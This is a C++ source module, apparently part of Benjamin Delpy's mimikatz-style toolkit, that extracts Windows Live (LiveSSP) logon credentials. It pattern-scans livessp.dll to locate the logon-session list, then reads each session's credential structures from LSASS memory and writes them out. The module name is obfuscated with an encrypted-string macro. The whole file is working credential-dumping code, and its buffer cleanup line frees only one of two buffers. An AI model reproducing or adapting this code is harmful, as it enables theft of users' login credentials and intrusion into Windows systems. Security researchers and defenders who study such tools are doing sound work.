/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include <Windows.h>
#include <Psapi.h>

#include "..\lpmemory.h"
#include "..\..\inc\dbg.h"
#include "..\..\inc\mem.h"	
#include "..\..\inc\CryptoStrings.h"	

#include "livessp.h"

PKIWI_LIVESSP_LIST_ENTRY LiveGlobalLogonSessionList;

VOID lssp_InitGlobals()
{
	LiveGlobalLogonSessionList = NULL;
}

bool searchLiveGlobalLogonSessionList(LP_MODULE_CONTEXT *pContext)
{
	LPWSTR wszLivessp;

#ifdef _M_X64
	BYTE PTRN_WALL_LiveUpdatePasswordForLogonSessions[]	= {0x48, 0x83, 0x65, 0xdf, 0x00, 0x48, 0x83, 0x65, 0xef, 0x00, 0x48, 0x83, 0x65, 0xe7, 0x00};
#elif defined _M_IX86
	BYTE PTRN_WALL_LiveUpdatePasswordForLogonSessions[]	= {0x89, 0x5d, 0xdc, 0x89, 0x5d, 0xe4, 0x89, 0x5d, 0xe0};
#endif
	LONG OFFS_WALL_LiveUpdatePasswordForLogonSessions	= -(5 + 4);

	if (pContext->pModLIVESSP && !LiveGlobalLogonSessionList)
	{
	
		wszLivessp = CRSTRW("livessp", "\x00\x60\xd6\x0d\x07\x60\xda\x0c\x06\x7d\x25\xf6\xe0\x68\xd5");

		PBYTE *pointeur = reinterpret_cast<PBYTE *>(&LiveGlobalLogonSessionList);
		if (HMODULE monModule = LoadLibrary(wszLivessp))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				lp_genericPatternSearch(pointeur, wszLivessp, PTRN_WALL_LiveUpdatePasswordForLogonSessions, sizeof(PTRN_WALL_LiveUpdatePasswordForLogonSessions), OFFS_WALL_LiveUpdatePasswordForLogonSessions);
				*pointeur += pContext->pModLIVESSP->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}

		my_free(wszLivessp);

	}
	return (pContext->pModLIVESSP && LiveGlobalLogonSessionList);
}

bool WINAPI getLiveSSPLogonData(LP_MODULE_CONTEXT *pContext, __in PLUID logId)
{
	if(searchLiveGlobalLogonSessionList(pContext))
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		BYTE * monBuffP = new BYTE[sizeof(KIWI_LIVESSP_LIST_ENTRY)], * monBuffC = new BYTE[sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL)];
		if(PKIWI_LIVESSP_LIST_ENTRY pLogSession = reinterpret_cast<PKIWI_LIVESSP_LIST_ENTRY>(lpgetPtrFromLinkedListByLuid(pContext, reinterpret_cast<PLIST_ENTRY>(LiveGlobalLogonSessionList), FIELD_OFFSET(KIWI_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), logId)))
		{
			if (lp_readMemory(pLogSession, monBuffP, sizeof(KIWI_LIVESSP_LIST_ENTRY), pContext->hLSASS))
			{
				pLogSession = reinterpret_cast<PKIWI_LIVESSP_LIST_ENTRY>(monBuffP);
				if(pLogSession->suppCreds)
				{
					if (lp_readMemory(pLogSession->suppCreds, monBuffC, sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL), pContext->hLSASS))
						mesCreds = &(reinterpret_cast<PKIWI_LIVESSP_PRIMARY_CREDENTIAL>(monBuffC)->credentials);
				} //else wcout << L"n.s. (SuppCred KO) / ";
			}
		}
		#ifdef _DEBUG
				pContext->wszPackageName = L"livessp";
		#endif
		lpgenericCredsToStream(pContext, mesCreds, TRUE);
		delete [] monBuffC, monBuffP;

	} //else { DbgPrint("ERR: livessp init failed"); }
	return true;
}